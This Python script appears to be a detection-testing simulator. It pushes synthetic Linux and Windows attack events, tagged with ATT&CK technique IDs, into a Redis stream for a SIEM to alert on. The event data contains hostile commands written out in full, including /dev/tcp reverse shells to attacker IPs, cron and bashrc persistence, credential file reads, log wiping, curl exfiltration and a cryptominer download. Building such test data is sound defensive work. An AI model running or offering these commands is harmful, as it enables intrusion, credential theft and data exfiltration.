#!/usr/bin/env python3
from __future__ import annotations
import argparse, json, time, uuid, os, sys
import redis

REDIS_URL   = os.environ.get("REDIS_URL",  "redis://localhost:6379/0")
STREAM_NAME = os.environ.get("REDIS_STREAM_NAME", "threatos:events:normalized")

SCENARIOS = {
    "linux_recon": {
        "name": "Linux Reconnaissance (T1087, T1069, T1057)",
        "description": "Attacker runs recon commands after initial access",
        "events": [
            {"process":"id",      "command_line":"id",                              "log_source":"syslog-auth","technique_id":"T1033"},
            {"process":"whoami",  "command_line":"whoami",                          "log_source":"syslog-auth","technique_id":"T1033"},
            {"process":"uname",   "command_line":"uname -a",                        "log_source":"syslog",     "technique_id":"T1082"},
            {"process":"cat",     "command_line":"cat /etc/passwd",                 "log_source":"syslog-auth","technique_id":"T1087.001"},
            {"process":"cat",     "command_line":"cat /etc/shadow",                 "log_source":"syslog-auth","technique_id":"T1003.008"},
            {"process":"netstat", "command_line":"netstat -tulpn",                  "log_source":"syslog",     "technique_id":"T1049"},
            {"process":"ps",      "command_line":"ps aux",                          "log_source":"syslog",     "technique_id":"T1057"},
            {"process":"find",    "command_line":"find / -perm -4000 -type f 2>/dev/null","log_source":"syslog","technique_id":"T1069"},
            {"process":"df",      "command_line":"df -h",                           "log_source":"syslog",     "technique_id":"T1680"},
        ],
    },
    "linux_privesc": {
        "name": "Linux Privilege Escalation (T1548.003)",
        "description": "Attacker escalates privileges via sudo abuse",
        "events": [
            {"process":"sudo",    "command_line":"sudo -l",                         "log_source":"syslog-auth","technique_id":"T1548.003"},
            {"process":"sudo",    "command_line":"sudo /bin/bash",                  "log_source":"syslog-auth","technique_id":"T1548.003"},
            {"process":"bash",    "command_line":"bash -i >& /dev/tcp/45.33.32.156/4444 0>&1","log_source":"syslog","technique_id":"T1059.004"},
            {"process":"python3", "command_line":"python3 -c 'import os; os.setuid(0)'","log_source":"syslog", "technique_id":"T1059.006"},
            {"process":"chmod",   "command_line":"chmod +s /bin/bash",              "log_source":"syslog",     "technique_id":"T1548"},
        ],
    },
    "linux_persistence": {
        "name": "Linux Persistence (T1053.003, T1546.004, T1098)",
        "description": "Attacker establishes persistence via cron, bashrc, SSH keys",
        "events": [
            {"process":"bash",    "command_line":"echo '* * * * * bash -i >& /dev/tcp/45.33.32.156/4444 0>&1' | crontab -","log_source":"syslog-cron","technique_id":"T1053.003"},
            {"process":"echo",    "command_line":"echo 'bash -i >& /dev/tcp/45.33.32.156/4444 0>&1' >> /etc/profile","log_source":"syslog","technique_id":"T1546.004"},
            {"process":"echo",    "command_line":"echo 'bash -i >& /dev/tcp/45.33.32.156/4444 0>&1' >> ~/.bashrc","log_source":"syslog","technique_id":"T1546.004"},
            {"process":"echo",    "command_line":"echo 'ssh-rsa AAAA...attacker_key' >> /root/.ssh/authorized_keys","log_source":"syslog-auth","technique_id":"T1098"},
            {"process":"systemctl","command_line":"systemctl enable backdoor.service","log_source":"syslog",    "technique_id":"T1543.002"},
        ],
    },
    "linux_credential_access": {
        "name": "Linux Credential Access (T1003.008, T1552)",
        "description": "Attacker dumps credentials and harvests secrets",
        "events": [
            {"process":"cat",     "command_line":"cat /etc/shadow",                 "log_source":"syslog-auth","technique_id":"T1003.008","user":"root"},
            {"process":"unshadow","command_line":"unshadow /etc/passwd /etc/shadow > /tmp/hashes.txt","log_source":"syslog-auth","technique_id":"T1003.008"},
            {"process":"cat",     "command_line":"cat /root/.ssh/id_rsa",           "log_source":"syslog-auth","technique_id":"T1552.004"},
            {"process":"find",    "command_line":"find / -name *.pem -o -name *.key 2>/dev/null","log_source":"syslog","technique_id":"T1552.001"},
            {"process":"cat",     "command_line":"cat /proc/1/environ",             "log_source":"syslog",     "technique_id":"T1003.007"},
            {"process":"grep",    "command_line":"grep -r password /etc/ 2>/dev/null","log_source":"syslog",   "technique_id":"T1552.001"},
        ],
    },
    "linux_lateral_movement": {
        "name": "Linux Lateral Movement (T1021.004, T1563.001)",
        "description": "Attacker moves laterally via SSH using stolen keys",
        "events": [
            {"process":"ssh",     "command_line":"ssh -i /tmp/stolen_key root@10.103.32.100","log_source":"syslog-auth","technique_id":"T1021.004"},
            {"process":"ssh",     "command_line":"ssh -i /tmp/stolen_key root@10.103.32.101","log_source":"syslog-auth","technique_id":"T1021.004"},
            {"process":"scp",     "command_line":"scp /tmp/payload root@10.103.32.100:/tmp/","log_source":"syslog-auth","technique_id":"T1021.004"},
            {"process":"ssh",     "command_line":"ssh -A -J jumphost root@internal-server",  "log_source":"syslog-auth","technique_id":"T1563.001"},
            {"process":"rsync",   "command_line":"rsync -avz /data/ root@10.103.32.100:/exfil/","log_source":"syslog","technique_id":"T1048"},
        ],
    },
    "linux_defense_evasion": {
        "name": "Linux Defense Evasion (T1070, T1562)",
        "description": "Attacker clears logs and disables security tools",
        "events": [
            {"process":"bash",    "command_line":"echo > /var/log/auth.log",        "log_source":"syslog",     "technique_id":"T1070.002"},
            {"process":"bash",    "command_line":"export HISTFILE=/dev/null",        "log_source":"syslog",     "technique_id":"T1562.003"},
            {"process":"bash",    "command_line":"history -c && unset HISTFILE",     "log_source":"syslog",     "technique_id":"T1562.003"},
            {"process":"systemctl","command_line":"systemctl stop auditd",           "log_source":"syslog",     "technique_id":"T1562.001"},
            {"process":"systemctl","command_line":"systemctl disable firewalld",     "log_source":"syslog",     "technique_id":"T1562.004"},
            {"process":"rm",      "command_line":"rm -rf /var/log/audit/audit.log",  "log_source":"syslog",     "technique_id":"T1070.002"},
            {"process":"bash",    "command_line":"export LD_PRELOAD=/tmp/rootkit.so","log_source":"syslog",     "technique_id":"T1204.005"},
        ],
    },
    "linux_exfiltration": {
        "name": "Linux Exfiltration (T1048, T1560, T1567)",
        "description": "Attacker exfiltrates data over HTTP, SCP, DNS",
        "events": [
            {"process":"tar",     "command_line":"tar czf /tmp/data.tar.gz /etc/ /home/ /var/www/","log_source":"syslog","technique_id":"T1560"},
            {"process":"curl",    "command_line":"curl -F data=@/tmp/data.tar.gz https://45.33.32.156/upload","log_source":"syslog","technique_id":"T1048"},
            {"process":"scp",     "command_line":"scp /tmp/data.tar.gz attacker@45.33.32.156:/exfil/","log_source":"syslog","technique_id":"T1048"},
            {"process":"curl",    "command_line":"curl -s https://pastebin.com/api/api_post.php -d api_dev_key=xxx","log_source":"syslog","technique_id":"T1567.003"},
            {"process":"curl",    "command_line":"curl -X POST https://discord.com/api/webhooks/xxx -d @/tmp/loot.txt","log_source":"syslog","technique_id":"T1567.004"},
        ],
    },
    "linux_cryptomining": {
        "name": "Cryptomining / Resource Hijacking (T1496.001)",
        "description": "Attacker installs cryptominer on compromised Linux server",
        "events": [
            {"process":"curl",    "command_line":"curl -o /tmp/xmrig http://45.33.32.156/xmrig","log_source":"syslog","technique_id":"T1496.001"},
            {"process":"chmod",   "command_line":"chmod +x /tmp/xmrig",             "log_source":"syslog",     "technique_id":"T1496.001"},
            {"process":"xmrig",   "command_line":"/tmp/xmrig --donate-level 1 -o stratum+tcp://pool.minexmr.com:443 -u wallet","log_source":"syslog","technique_id":"T1496.001"},
            {"process":"crontab", "command_line":"*/5 * * * * /tmp/xmrig -o stratum+tcp://pool.minexmr.com:443","log_source":"syslog-cron","technique_id":"T1053.003"},
        ],
    },
    "linux_webshell": {
        "name": "Web Shell (T1505.003)",
        "description": "Attacker uploads web shell and executes commands via HTTP",
        "events": [
            {"process":"nginx",   "command_line":"GET /uploads/shell.php?cmd=id HTTP/1.1 200",  "log_source":"nginx","technique_id":"T1505.003"},
            {"process":"nginx",   "command_line":"GET /uploads/shell.php?cmd=cat+/etc/passwd HTTP/1.1 200","log_source":"nginx","technique_id":"T1505.003"},
            {"process":"nginx",   "command_line":"GET /uploads/shell.php?cmd=wget+http://45.33.32.156/payload HTTP/1.1 200","log_source":"nginx","technique_id":"T1505.003"},
            {"process":"php-fpm", "command_line":"php -r system(bash -i >& /dev/tcp/45.33.32.156/4444 0>&1);","log_source":"syslog","technique_id":"T1059.004"},
        ],
    },
    "ssh_bruteforce": {
        "name": "SSH Brute Force (T1110.001)",
        "description": "Attacker brute forces SSH from external IP",
        "events": [
            {"process":"sshd","command_line":"Failed password for invalid user admin from 45.33.32.156 port 22 ssh2",   "log_source":"syslog-auth","technique_id":"T1110.001","src_ip":"45.33.32.156"},
            {"process":"sshd","command_line":"Failed password for invalid user root from 45.33.32.156 port 22 ssh2",    "log_source":"syslog-auth","technique_id":"T1110.001","src_ip":"45.33.32.156"},
            {"process":"sshd","command_line":"Failed password for invalid user ubuntu from 45.33.32.156 port 22 ssh2",  "log_source":"syslog-auth","technique_id":"T1110.001","src_ip":"45.33.32.156"},
            {"process":"sshd","command_line":"Failed password for invalid user oracle from 45.33.32.156 port 22 ssh2",  "log_source":"syslog-auth","technique_id":"T1110.001","src_ip":"45.33.32.156"},
            {"process":"sshd","command_line":"Failed password for invalid user postgres from 45.33.32.156 port 22 ssh2","log_source":"syslog-auth","technique_id":"T1110.001","src_ip":"45.33.32.156"},
            {"process":"sshd","command_line":"Accepted password for root from 45.33.32.156 port 22 ssh2",              "log_source":"syslog-auth","technique_id":"T1078",     "src_ip":"45.33.32.156"},
        ],
    },
    "sudo_abuse": {
        "name": "Sudo Abuse & Privilege Escalation (T1548.003)",
        "description": "Attacker abuses sudo misconfiguration to escalate privileges",
        "events": [
            {"process":"sudo","command_line":"sudo -l",                             "log_source":"syslog-auth","technique_id":"T1548.003","user":"webuser"},
            {"process":"sudo","command_line":"sudo vim -c :!/bin/bash",             "log_source":"syslog-auth","technique_id":"T1548.003","user":"webuser"},
            {"process":"sudo","command_line":"sudo python3 -c import os; os.system(/bin/bash)","log_source":"syslog-auth","technique_id":"T1548.003","user":"webuser"},
            {"process":"bash","command_line":"echo webuser ALL=(ALL) NOPASSWD: ALL >> /etc/sudoers","log_source":"syslog-auth","technique_id":"T1548.003"},
        ],
    },
    "full_linux_attack": {
        "name": "Full Linux Attack Chain (SSH BruteForce to Exfiltration)",
        "description": "Complete Linux attack: SSH brute force > recon > privesc > persistence > lateral > exfil",
        "events": [
            {"process":"sshd",    "command_line":"Failed password for root from 185.220.101.34 port 22 ssh2",        "log_source":"syslog-auth","technique_id":"T1110.001","src_ip":"185.220.101.34"},
            {"process":"sshd",    "command_line":"Failed password for root from 185.220.101.34 port 22 ssh2",        "log_source":"syslog-auth","technique_id":"T1110.001","src_ip":"185.220.101.34"},
            {"process":"sshd",    "command_line":"Accepted password for root from 185.220.101.34 port 22 ssh2",      "log_source":"syslog-auth","technique_id":"T1078",     "src_ip":"185.220.101.34"},
            {"process":"uname",   "command_line":"uname -a",                                                         "log_source":"syslog",     "technique_id":"T1082"},
            {"process":"cat",     "command_line":"cat /etc/passwd",                                                  "log_source":"syslog-auth","technique_id":"T1087.001"},
            {"process":"ps",      "command_line":"ps aux",                                                           "log_source":"syslog",     "technique_id":"T1057"},
            {"process":"netstat", "command_line":"netstat -tulpn",                                                   "log_source":"syslog",     "technique_id":"T1049"},
            {"process":"cat",     "command_line":"cat /etc/shadow",                                                  "log_source":"syslog-auth","technique_id":"T1003.008"},
            {"process":"cat",     "command_line":"cat /root/.ssh/id_rsa",                                            "log_source":"syslog-auth","technique_id":"T1552.004"},
            {"process":"sudo",    "command_line":"sudo -l",                                                          "log_source":"syslog-auth","technique_id":"T1548.003"},
            {"process":"sudo",    "command_line":"sudo /bin/bash",                                                   "log_source":"syslog-auth","technique_id":"T1548.003"},
            {"process":"bash",    "command_line":"export HISTFILE=/dev/null",                                        "log_source":"syslog",     "technique_id":"T1562.003"},
            {"process":"bash",    "command_line":"echo > /var/log/auth.log",                                         "log_source":"syslog",     "technique_id":"T1070.002"},
            {"process":"bash",    "command_line":"echo * * * * * bash -i >& /dev/tcp/185.220.101.34/4444 0>&1 | crontab -","log_source":"syslog-cron","technique_id":"T1053.003"},
            {"process":"echo",    "command_line":"echo ssh-rsa ATTACKER_KEY >> /root/.ssh/authorized_keys",          "log_source":"syslog-auth","technique_id":"T1098"},
            {"process":"ssh",     "command_line":"ssh -i /root/.ssh/id_rsa root@10.103.32.100",                      "log_source":"syslog-auth","technique_id":"T1021.004"},
            {"process":"scp",     "command_line":"scp /tmp/payload root@10.103.32.100:/tmp/payload",                 "log_source":"syslog-auth","technique_id":"T1021.004"},
            {"process":"tar",     "command_line":"tar czf /tmp/loot.tar.gz /etc/ /home/ /root/.ssh/",                "log_source":"syslog",     "technique_id":"T1560"},
            {"process":"curl",    "command_line":"curl -F file=@/tmp/loot.tar.gz https://185.220.101.34/upload",     "log_source":"syslog",     "technique_id":"T1048"},
        ],
    },
    "rdp_bruteforce": {
        "name": "RDP Brute Force (T1110.003)",
        "description": "Attacker password spraying via RDP",
        "events": [
            {"process":"mstsc","command_line":"Failed RDP logon for administrator from 45.33.32.156","log_source":"winlog","technique_id":"T1110.003","src_ip":"45.33.32.156"},
            {"process":"mstsc","command_line":"Failed RDP logon for administrator from 45.33.32.156","log_source":"winlog","technique_id":"T1110.003","src_ip":"45.33.32.156"},
            {"process":"mstsc","command_line":"Successful RDP logon for administrator from 45.33.32.156","log_source":"winlog","technique_id":"T1110.003","src_ip":"45.33.32.156"},
        ],
    },
    "psexec": {
        "name": "PSExec Lateral Movement (T1569.002)",
        "description": "Attacker using PSExec for remote execution",
        "events": [
            {"process":"psexec",   "command_line":"psexec \\WIN-SERVER01 -u administrator cmd","log_source":"winlog","technique_id":"T1569.002"},
            {"process":"PSEXESVC", "command_line":"PSEXESVC.exe installed on WIN-SERVER01",      "log_source":"winlog","technique_id":"T1569.002"},
            {"process":"cmd.exe",  "command_line":"cmd.exe /c whoami",                           "log_source":"winlog","technique_id":"T1059.003"},
            {"process":"net.exe",  "command_line":"net user hacker P@ssw0rd /add",              "log_source":"winlog","technique_id":"T1098.007"},
        ],
    },
}

def push_event(r, event, host):
    e = {
        "event_id":    str(uuid.uuid4()),
        "log_source":  event.get("log_source", "syslog"),
        "host":        host,
        "user":        event.get("user", "root"),
        "process":     event.get("process", ""),
        "command_line":event.get("command_line", ""),
        "parent_process": event.get("parent_process", ""),
        "src_ip":      event.get("src_ip", ""),
        "dst_ip":      event.get("dst_ip", ""),
        "dst_port":    str(event.get("dst_port", "")),
        "file_path":   event.get("file_path", ""),
        "file_hash":   event.get("file_hash", ""),
        "message":     event.get("command_line", "")[:500],
        "raw_fields":  json.dumps({"technique_id": event.get("technique_id","")}),
    }
    r.xadd(STREAM_NAME, e)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host",     default="linux-server01")
    parser.add_argument("--scenario", default=None)
    parser.add_argument("--list",     action="store_true")
    parser.add_argument("--delay",    type=float, default=0.1)
    args = parser.parse_args()

    if args.list:
        print("\nAvailable scenarios:\n")
        for key, s in SCENARIOS.items():
            print(f"  {key:<35} {s['name']}")
        return

    r = redis.from_url(REDIS_URL, decode_responses=True, protocol=2)
    r.ping()
    print(f"Connected to Redis. Stream: {STREAM_NAME}")
    print(f"Target host: {args.host}\n")

    if args.scenario:
        if args.scenario not in SCENARIOS:
            print(f"Unknown: {args.scenario}. Use --list")
            sys.exit(1)
        to_run = {args.scenario: SCENARIOS[args.scenario]}
    else:
        to_run = SCENARIOS

    total = 0
    for key, scenario in to_run.items():
        print(f"► {scenario['name']}")
        print(f"  {scenario['description']}")
        for i, event in enumerate(scenario["events"], 1):
            push_event(r, event, args.host)
            print(f"    [{i}] {event['command_line'][:65]}")
            time.sleep(args.delay)
            total += 1
        print()

    print(f"Done. Pushed {total} events to {args.host}")
    print(f"Wait 5s then check: curl -s http://localhost:8001/api/alerts")

if __name__ == "__main__":
    main()
